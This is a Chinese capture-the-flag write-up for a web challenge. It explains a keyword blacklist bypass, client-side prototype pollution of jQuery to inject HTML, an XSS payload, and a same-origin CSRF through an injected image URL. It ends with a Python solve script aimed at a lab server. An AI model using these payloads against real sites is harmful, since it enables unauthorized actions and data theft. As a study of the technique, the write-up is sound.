选手zeroc的writeup:
给了个bot，获取flag的逻辑：
```js
app.get('/admin/check', authenticateAdmin, (req, res)=> {
    let harmonious = req.query['harmonious'] ? req.query['harmonious'] : '**';
    if(/^[A-Za-z][ -9A-Za-z]+$/.test(harmonious)) {
        res.redirect("/");
    }
    if(req.query['appeal_id']) {
        query = `SELECT appeal_content FROM appeal WHERE appeal_id = ? and appeal_type = 'appeal'`;
        db.all(query,[req.query['appeal_id']], (err, rows) => {
            if(!err){
                try{
                    let row = rows[rows.length - 1]['appeal_content'];
                    let content = utils.purify(JSON.parse(row), /or4nge/g, harmonious), comment = ''; 
                    if(JSON.stringify(content).includes("i love or4nge")) {
                        console.log("win");
                        comment = fs.readFileSync('flag.txt').toString()
                    }else{
                        comment = "已阅,下次一定";
                    }
                    content['comment'] = comment;
                    query = `UPDATE appeal SET appeal_content = ? WHERE appeal_id = ?`;
                    db.run(query, [JSON.stringify(content), req.query['appeal_id']]);
                }catch {
                }
                res.redirect("/appeal");
            }
        });
    }else{
        res.redirect('/');
    }
});
```
可以看到目的就是使 bot 访问 `/admin/check` 这个路由。

POST `/appeal/add` 可以添加诉求，会覆盖之前 appeal_id 的诉求；

GET `/appeal/get` 查看诉求；

`/admin/login` 需要 admin_pass 才能登录；

`/admin/check` 存在鉴权，需要 admin_token。

```js
app.get('/admin/login', (req, res) => {
    if(req.query['pass'] === admin_pass){
        res.cookie('Authentication', admin_token, {maxAge: new Date(Date.now() + 3600000), httpOnly: true, sameSite:'strict'});
    }
    res.redirect('/');
});
```
admin_token 是存在 Cookie 中的。
诉求黑名单：
```js
const banWords = ['javascript:window', '<', '>', 'data:text/html', 'alert', 'confirm', 'expression', 'prompt', 'benchmark', 'sleep', 'group', 'concat', 'bcase', 'when', 'load_file', 'or4nge','and',  'bin', 'blike', 'script', 'exec', 'union', 'select', 'update', 'set', 'insert', 'into', 'values', 'from', 'create',  'alterdrop', 'truncate', 'table', 'database', 'onerror', 'onmousemove', 'onload', 'onclick', 'onmouseover', 'file_put_contents', 'file_get_contents', 'fwrite', 'base64_decode', 'shell_exec', 'eval', 'assert', 'system', 'exec', 'passthru', 'pcntl_exec', 'popen', 'proc_open', 'print_r', 'extractvalue', 'data', 'ftp', 'php', 'regexp', '=', 'sleep', '0x', 'file', 'dict'];
```
黑名单用的是 replace，只会替换出现的第一个，很容易绕过，那么接下来就是应该构造 XSS。

构造时发现 <> 会被转义，这里是 jQuery 中的逻辑：
```js
$(function() {
        var appeal = {'群公告': {'msg':'ihome就是我们的家，我们要好好维护她'}};
        fetch('/appeal/get', {
            method: 'get', 
            credentials: 'same-origin'
        }).then(response => response.json())
        .then(data =>  {
            extend(appeal,data);
            for(let key of Object.keys(appeal)){
                var title = key;
                var content = JSON.stringify(appeal[key]);
                var comment = '6';
                if(key == 'appeal')title = '我的诉求',comment = "管理员还没上班，别急";
                else if(key == 'comment') {
                    title = '我的动态' ;
                }
                if(appeal[key]['msg'])content=appeal[key]['msg'];
                if(appeal[key]['comment'] && key == 'appeal')comment=appeal[key]['comment'];
                var newElement = $("<div class='panel panel-default'><h5 class='panel-heading'></h5><p class='panel-body'></p><div class='panel-footer'></div></div>");
                newElement.find(".panel-heading").text(title);
                newElement.find(".panel-body").text(content);
                newElement.find(".panel-footer").text('管理员回复: '+ comment);
                $("#content").append(newElement);
            }
            
        });
        console.log(1);
    });
```
这里使用 `text()` 而不是 `html()`，所以会对字符进行转义，同时发现存在一段可疑的 extend：
```js
function extend(target){
    for (var i = 1; i < arguments.length; i++) {
        var source = arguments[i]
        for (var key in source) {
            if (key === '__proto__') {
                return;
            }
            if (hasOwnProperty.call(source, key)) {
                if (key in source && key in target) {
                    extend(target[key], source[key])
                } else {
                    target[key] = source[key]
                }
            }
        }
    }
    return target
};
```
应该是原型链污染了，这里赛后才知道能污染 html 的标签：https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/jquery.md 主要原因是这里使用了 jQuery。

尝试使用原型链污染注入 XSS：
```
{
    "type":"constructor",
    "content":"{\"bypass\":\"<>=onerroralert\",\"prototype\":{\"div\":[\"1\",\"<img src='x' onerror=alert(1)>\"]}}"
}
```
这里是可以实现注入的，但是发现制定了很严格的 CSP，那么 XSS 应该是比较困难的了。
```js
res.setHeader("Content-Security-Policy", "default-src 'none'; object-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self'; font-src 'self'; connect-src 'self';");
```
接下来有点类似于 KalmarCTF 中的一个黑盒题，那道题是 bot 会自动访问用户头像所指向的链接，通过修改头像链接来 CSRF，这里参考这种思路，在 <img src=> 中注入 /admin/check 这个路由来进行 CSRF，因为这里不涉及到跨域，所以是能够实现的。

因为赛后 bot 炸了，出题人给了 admin_token 和 admin_pass，就直接自己访问了：
```python
import requests

target = "http://10.212.26.206:21451"
#! add the "i love or4nge"
cookies = {"appeal_id": "fc4c5b8effd0d8207167831e10304c6f1180"}
json={"content": "{\"msg\":\"i love or4ngei love or4ngeor4nge\"}", "type": "appeal"}
requests.post(target+"/appeal/add", cookies=cookies, json=json)
#! pollute the div
# cookies = {"appeal_id": "b3a9cddc288bb824e2f2140ae859dddcd66e"}
# json={"content": "{\"prototype\":{\"div\":[\"1\",\"<=or>< img src='/admin/check?appeal_id=fc4c5b8effd0d8207167831e10304c6f1180&harmonious=$`'>\"]}}", "type": "constructor"}
# requests.post(target+"/appeal/add", cookies=cookies, json=json)
#! curl the bot
cookies = {"Authentication": "77037611-b007-7030-ed56-ca23b30a7e20"}
requests.get(target+"/admin/check?appeal_id=fc4c5b8effd0d8207167831e10304c6f1180&harmonious=$`", cookies=cookies)
#! get the flag
cookies = {"appeal_id": "fc4c5b8effd0d8207167831e10304c6f1180"}
r = requests.get(target+"/appeal/get", cookies=cookies)
print(r.text)
```